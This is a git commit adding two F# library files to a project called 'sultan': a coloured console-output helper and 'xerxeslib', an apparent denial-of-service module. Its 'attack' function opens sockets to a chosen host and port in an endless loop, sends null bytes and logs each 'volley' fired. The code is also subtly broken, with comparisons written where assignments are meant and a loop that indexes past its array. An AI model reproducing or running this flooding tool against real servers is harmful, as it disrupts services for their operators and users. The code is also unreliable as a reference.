d34ffcf79e01c3081b9754c3f7c6758e7b63ba98
Kied T L <eli.georgios@gmail.com>
2019-02-15 13:48:22 -0500

    Add xerxeslib and printxlib

---
+++ lib/printxlib.fs
@@ -0,0 +1,37 @@
+namespace sultan
+
+open System
+open sultan
+
+module printxlib =
+    let E : string = string (char 0x1B)
+    let printx (text : string) (rgb : string) =
+        let parsedrgb = (rgb.Split(","))
+        if parsedrgb.Length < 3 then
+            raise (System.ArgumentException("Invalid RGB color: " + rgb))
+        else
+            consoletool.enableVTMode() |> ignore
+            let r = parsedrgb.[0]
+            let g = parsedrgb.[1]
+            let b = parsedrgb.[2]
+            printf "%s[38;2;%s;%s;%sm%s%s[0m" E r g b text E
+
+    let error (text : string) =
+        consoletool.enableVTMode() |> ignore
+        let message : string = "err! " + text
+        eprintf "[sultan] %s[38;2;255;0;0m%s%s[0m" E message E
+
+    let warning (text : string) =
+        consoletool.enableVTMode() |> ignore
+        let message : string = "warn " + text
+        printf "[sultan] %s[38;2;249;225;100m%s%s[0m" E message E
+
+    let success (text : string) =
+        consoletool.enableVTMode() |> ignore
+        let message : string = text
+        printf "[sultan] %s[38;2;24;220;10m%s%s[0m" E message E
+
+    let verbose (text : string) =
+        consoletool.enableVTMode() |> ignore
+        let message : string = "verb " + text
+        printf "[sultan] %s[38;2;50;190;250m%s%s[0m" E message E
---
+++ lib/xerxeslib.fs
@@ -0,0 +1,31 @@
+namespace sultan
+
+open sultan
+open sultan.printxlib
+
+open socklib
+
+open System
+open System.IO
+open System.Net
+open System.Text
+open System.Net.Sockets
+
+module xerxeslib =
+    let nil : string = string (char 0x00)
+
+    let attack (host : string) (port : int) (id : int) (connections : int) =
+        if port = 0 then port = 80 else true
+        if connections = 0 then connections = 10 else true
+        let sockets : Socket array = Array.create 10 (null)
+        let x : int = 0
+        let g : int = 1
+        let r : int = 0
+        while true do
+            for x = 0 to sockets.Length do
+                sockets.[x] = socketutil.connect(host, port)
+                let request : byte array = Encoding.ASCII.GetBytes (nil)
+                let currentsocket : Socket = sockets.[x]
+                r = currentsocket.Send(request)
+                verbose ("volley [" + x.ToString() + "] fired")
+            success ("round [" + id.ToString() + "] fired")
